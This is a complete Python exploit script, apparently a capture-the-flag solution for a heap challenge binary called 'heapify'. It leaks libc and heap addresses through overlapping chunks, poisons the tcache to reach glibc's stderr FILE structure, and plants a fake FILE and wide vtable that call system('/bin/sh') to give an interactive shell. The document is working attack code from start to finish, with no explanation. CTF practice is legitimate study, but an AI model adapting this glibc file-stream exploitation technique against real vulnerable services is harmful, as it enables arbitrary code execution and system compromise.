#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./heapify_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def alloc(size: int, data: bytes) -> int:
        io.sendlineafter(b"choice: ", b"1")
        io.sendlineafter(b"size: ", str(size).encode())
        io.sendlineafter(b"data: ", data)
        io.recvuntil(b"index: ")
        index = int(io.recvline().strip(b"\n"))
        return index

    def delete(index: int):
        io.sendlineafter(b"choice: ", b"2")
        io.sendlineafter(b"index: ", str(index))
        return

    def view(index) -> bytes:
        io.sendlineafter(b"choice: ", b"3")
        io.sendlineafter(b"index: ", str(index))
        return io.recvuntil(b"\nyour", drop=True)

    alloc(0x18, b"")  # 0

    alloc(0x18, b"A")  # 1
    alloc(0x18, b"B")  # 2
    alloc(0x18, b"C")  # 3
    alloc(0x3E8, b"D")  # 4
    alloc(0x18, b"E")  # 5
    delete(1)
    alloc(0x18, b"F" * 0x18 + ptr.p64(0x431))  # 6
    delete(2)
    alloc(0x18, b"G" * 4)  # 7
    libc.base = ptr.u64(view(3)) - unwrap(libc.symbol("main_arena")) - 96
    alloc(0x408, b"H" * 4)  # 8
    delete(3)
    heap_base = (ptr.u64(view(8)) << 12) - 0x1000
    ptr.logger.info(f"heap_base: {hex(heap_base)}")

    stderr = unwrap(libc.symbol("_IO_2_1_stderr_"))

    alloc(0x18, b"A" * 4)  # 9
    alloc(0x18, b"B" * 4)  # 10
    alloc(0x18, b"C" * 4)  # 11
    alloc(0x18, b"C" * 4)  # 12
    delete(11)
    delete(10)
    delete(9)
    alloc(0x18, b"A" * 0x20 + ptr.p64(((heap_base + 0x1760) >> 12) ^ stderr))  # 13
    delete(13)
    alloc(0x18, b"A" * 0x18 + ptr.p64(0x21)[:-1])  # 14

    fake_wide_vtable_addr = heap_base + 0x17C0
    fake_wide_vtable = b""
    fake_wide_vtable = fake_wide_vtable.ljust(0x68, b"\0")
    fake_wide_vtable += ptr.p64(
        unwrap(libc.symbol("system"))
    )  # _wide_vtable->doallocate = RIP

    fake_wide_data_addr = heap_base + 0x18C0
    fake_wide_data = b""
    fake_wide_data = fake_wide_data.ljust(0x18, b"\0")
    fake_wide_data += ptr.p64(0)  # _wide_data->_IO_write_base = 0
    fake_wide_data = fake_wide_data.ljust(0x30, b"\0")
    fake_wide_data += ptr.p64(0)  # _wide_data->_IO_buf_base = 0
    fake_wide_data = fake_wide_data.ljust(0xE0, b"\0")
    fake_wide_data += ptr.p64(
        fake_wide_vtable_addr
    )  # _wide_data->_wide_vtable = &fake_vtable

    alloc(0xF8, fake_wide_vtable)
    alloc(0xF8, fake_wide_data)

    fake_file = b""
    fake_file += b"  /bin/sh;"
    fake_file = fake_file.ljust(0x28, b"\0")
    fake_file += ptr.p64(1)  # file->_IO_write_ptr > file->_IO_write_base
    fake_file = fake_file.ljust(0xA0, b"\0")
    fake_file += ptr.p64(fake_wide_data_addr)  # file->_wide_data = &fake_wide_data
    fake_file = fake_file.ljust(0xD8, b"\0")
    fake_file += ptr.p64(
        unwrap(libc.symbol("_IO_wfile_jumps"))
    )  # file->vtable = &_IO_wfile_jumps

    alloc(0x18, b"A")
    alloc(0x18, fake_file)

    io.sendlineafter(b"choice: ", b"4")

    io.interactive()
    return


if __name__ == "__main__":
    main()
